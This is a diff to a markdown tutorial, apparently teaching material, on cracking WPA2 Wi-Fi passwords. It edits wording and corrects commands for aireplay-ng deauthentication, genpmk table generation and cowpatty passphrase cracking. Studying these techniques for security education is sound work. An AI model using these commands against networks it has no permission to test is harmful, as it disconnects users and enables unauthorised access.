@@ -39,8 +39,7 @@ iw dev
    * `aireplay-ng -0 2 -a <AP_MAC_ADDRESS> <INTERFACE_NAME_MONITOR_MODE>`
 ![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/4.%20handshake.png?raw=true)
 
- * Once the WPA2 handshake has been captured, we can start hacking the password 
-v
+ * Once the WPA2 handshake has been captured, we can start cracking the password
 
 
 ## Bruteforce attack using dictionaries
@@ -91,7 +90,8 @@ genpmk -f <PATH_TO_DICTIONARY> -s <NETWORK_SSID> -d <OUTPUT_RAINBOW_TABLE>
 ```
 
 Cowpatty can be executed in the following way
- * `cowpatty -d <OUTPUT_RAINBOW_TABLE> -r <OUTPUT_FILE_CAPTURE> -s <<NETWORK_SSID>> -2`
+ * `cowpatty -d <OUTPUT_RAINBOW_TABLE> -r <OUTPUT_FILE_CAPTURE> -s <NETWORK_SSID>`
+![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/6.%20rainbow%20table.png?raw=true)
 ## Stop Monitor Mode
 
 Remember to disable the **monitor mode** from your wireless network card
